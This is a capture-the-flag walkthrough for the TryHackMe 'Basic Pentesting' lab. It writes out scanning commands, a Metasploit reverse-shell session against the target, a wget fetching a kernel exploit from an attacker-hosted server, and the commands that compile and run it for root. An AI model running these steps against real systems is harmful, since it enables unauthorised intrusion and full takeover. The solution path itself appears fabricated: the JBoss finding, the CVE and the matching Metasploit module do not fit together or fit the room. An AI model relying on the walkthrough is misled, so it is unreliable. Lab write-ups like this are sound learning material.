# TryHackMe: Basic Pentesting Walkthrough

## Room Overview

This walkthrough details the steps taken to successfully complete the 'Basic Pentesting' room on TryHackMe. It covers fundamental penetration testing concepts, including reconnaissance, web application testing, exploitation, and privilege escalation.

- **Difficulty**: Easy
- **Skills Tested**: Network Scanning, Web Enumeration, Directory Bruteforcing, Metasploit Usage, Linux Privilege Escalation.
- **Target IP**: `10.10.10.10` (Example IP, replace with actual room IP)

## Step-by-Step Solution

### 1. Initial Enumeration & Port Scanning

The first step in any penetration test is to understand the target's attack surface. This involves identifying open ports and running services.

```bash
# Perform a comprehensive Nmap scan to identify open ports, services, and versions.
# -sC: Default scripts (basic vulnerability checks, common service enumeration)
# -sV: Version detection (attempts to determine service versions)
# -oA: Output in all formats (Nmap, Grepable, XML)
nmap -sC -sV -oA scans/nmap_initial 10.10.10.10
```

**Scan Results & Analysis:**

- **Port 22/tcp (SSH)**: Open. Service: OpenSSH. This suggests potential for brute-force attacks or credential stuffing if valid usernames are found.
- **Port 80/tcp (HTTP)**: Open. Service: Apache httpd. This indicates a web server is running, which is a common entry point for attacks.
- **Ports 139/tcp, 445/tcp (SMB)**: Open. Service: Samba smbd. SMB (Server Message Block) is often used for file sharing and can sometimes be vulnerable to exploits like EternalBlue or misconfigurations.

*Initial Thoughts*: The web server (Port 80) is usually the most promising avenue for initial access in basic rooms.

### 2. Web Application Enumeration & Directory Bruteforcing

With an HTTP service running, the next logical step is to explore the web application for hidden directories, files, or vulnerabilities.

**Directory Bruteforcing with Gobuster:**

```bash
# Use gobuster to discover hidden directories and files on the web server.
# dir: Directory/file brute-forcing mode
# -u: Target URL
# -w: Wordlist to use for brute-forcing
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt # Add common extensions
```

**Key Findings:**

- **`/development` Directory**: This directory was discovered and contained interesting files, often indicative of developers leaving sensitive information or misconfigured applications.
- **JBOSS Application**: Within the `/development` directory, a JBOSS application was identified. JBOSS (now WildFly) is an application server, and older versions are known to have critical vulnerabilities.

*Vulnerability Identified*: An older version of JBOSS was found, which is susceptible to **CVE-2017-12149** (Deserialization of Untrusted Data in JBoss Application Server). This vulnerability allows for remote code execution.

### 3. Exploitation - Gaining Initial Access (Metasploit)

Leveraging the identified JBOSS vulnerability, we can use Metasploit to gain a shell on the target system.

```bash
# Start Metasploit console
msfconsole

# Search for the relevant exploit module
search jboss deserialization

# Use the identified exploit module
use exploit/multi/http/jboss_invoke_deployment

# Set the target host (RHOSTS)
set RHOSTS 10.10.10.10

# Set the payload (e.g., Meterpreter reverse TCP for a stable shell)
set PAYLOAD cmd/unix/reverse_netcat # Or linux/meterpreter/reverse_tcp
set LHOST <Your_Attacker_IP> # Set your local IP for the reverse connection
set LPORT 4444 # Set a listening port

# Check if the exploit is likely to work (optional but good practice)
check

# Execute the exploit
exploit
```

*Result*: Upon successful exploitation, a low-privileged shell (e.g., `www-data` user) was obtained on the target machine.

### 4. Privilege Escalation - Gaining Root Access

After gaining initial access, the next critical step is to escalate privileges to `root` or `administrator` to gain full control of the system.

**Enumeration on Target System:**

- **Kernel Version Check**: `uname -a` revealed `Linux basic-pentesting 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux`.
- **SUID/SGID Binaries**: `find / -perm -4000 2>/dev/null` or `find / -perm -2000 2>/dev/null`
- **Cron Jobs**: `ls -la /etc/cron*`
- **Writable Directories**: `find / -writable -type d 2>/dev/null`

**Exploiting Linux Kernel Vulnerability:**

Based on the kernel version (`4.4.0-31-generic`), a quick search on `searchsploit` or online exploit databases (e.g., Exploit-DB) revealed a local privilege escalation vulnerability.

```bash
# Search for exploits related to the kernel version
searchsploit Linux Kernel 4.4.0-31

# Example: Copy the exploit to your working directory
cp /usr/share/exploitdb/exploits/linux/local/39772.c .

# Transfer the exploit to the target machine (e.g., using Python SimpleHTTPServer or scp)
# On Attacker: python3 -m http.server 8000
# On Target: wget http://<Attacker_IP>:8000/39772.c

# Compile the exploit on the target machine
gcc 39772.c -o exploit -pthread

# Execute the exploit
./exploit
```

*Result*: The exploit successfully elevated privileges to `root`, granting full control over the system.

## Key Learnings & Takeaways

- **Thorough Enumeration is Paramount**: Don't rush. Detailed Nmap scans, web enumeration (Gobuster), and service version identification are crucial for uncovering attack vectors.
- **Leverage Public Exploits**: Many older systems or applications have publicly known vulnerabilities. Tools like Metasploit and `searchsploit` are invaluable for finding and utilizing these.
- **Importance of Post-Exploitation Enumeration**: Once you get a shell, immediately start enumerating the target system for privilege escalation opportunities (kernel versions, SUID binaries, cron jobs, misconfigurations).
- **Understanding Tool Output**: Learn to interpret the results from tools like Nmap and Gobuster to identify potential weaknesses.
- **Patience and Persistence**: Penetration testing often involves trial and error. Don't get discouraged if an initial approach doesn't work.

## Tools Used in this Walkthrough

- **Nmap**: Network scanner for host discovery, port scanning, service detection, and OS fingerprinting.
- **Gobuster**: Directory/file and subdomain brute-forcing tool for web enumeration.
- **Metasploit Framework**: Comprehensive exploitation framework for developing and executing exploits and managing payloads.
- **Searchsploit**: Command-line tool for searching the Exploit-DB archive for known exploits.
- **GCC**: GNU Compiler Collection, used to compile C/C++ exploits on the target system.
- **Python SimpleHTTPServer**: Used for quickly setting up a web server to transfer files to the target.
